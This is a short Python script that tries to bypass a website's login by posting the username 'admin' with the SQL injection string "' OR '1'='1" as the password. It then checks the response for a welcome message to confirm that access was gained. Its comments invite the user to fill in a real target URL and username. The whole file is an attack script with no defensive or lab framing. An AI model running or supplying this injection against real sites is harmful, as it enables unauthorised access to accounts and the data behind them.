import requests
from bs4 import BeautifulSoup as soup

# Set up the URL and data we want to send
url = "http://example.com/login" # Change to actual url
data = {
    'username': 'admin',  # Change to actual username
    'password': "' OR '1'='1",  # Injecting SQL code here
}

# Perform the POST request and get the response
response = requests.post(url, data=data)

# Check if we are logged in successfully
if 'Welcome admin' in response.text:
    print("Success! You are logged in.")
else:
    print("Failed to login. Please check your credentials or try again later.")